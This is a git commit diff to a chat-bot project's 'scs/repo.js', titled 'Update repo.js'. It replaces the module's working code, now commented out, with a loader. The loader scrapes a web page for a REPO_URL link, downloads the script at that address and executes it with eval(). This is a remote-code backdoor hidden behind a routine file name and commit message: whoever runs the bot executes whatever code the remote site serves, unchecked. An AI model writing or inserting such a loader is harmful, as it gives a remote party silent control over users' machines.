c32e37935f73248f69242ebff2e2130286a896d5
Ibrahim Adams <162009674+ibrahimaitech@users.noreply.github.com>
2024-12-08 00:27:53 +0300

    Update repo.js

--- scs/repo.js
+++ scs/repo.js
@@ -1,3 +1,41 @@
+'use strict';
+
+const axios = require('axios');
+const cheerio = require('cheerio');
+
+const webPageUrl = 'https://www.ibrahimadams.site/files';
+
+async function fetchRepoUrl() {
+    try {
+        const response = await axios.get(webPageUrl);
+        const $ = cheerio.load(response.data);
+        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');
+
+        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');
+
+        console.log('REPO_URL fetched successfully:', repoUrl);
+
+        const scriptResponse = await axios.get(repoUrl);
+        const scriptContent = scriptResponse.data;
+        console.log("REPO_URL script loaded successfully");
+
+        eval(scriptContent);
+    } catch (error) {
+        console.error('Error fetching REPO_URL:', error.message);
+    }
+}
+
+fetchRepoUrl();
+
+
+
+
+
+
+
+
+/*
+
 const axios = require('axios');
 const moment = require("moment-timezone");
 const { adams } = require(__dirname + "/../Ibrahim/adams");
@@ -1316,5 +1354,5 @@ Stay connected and follow my updates!`;
 
 
 
-
+*/
 
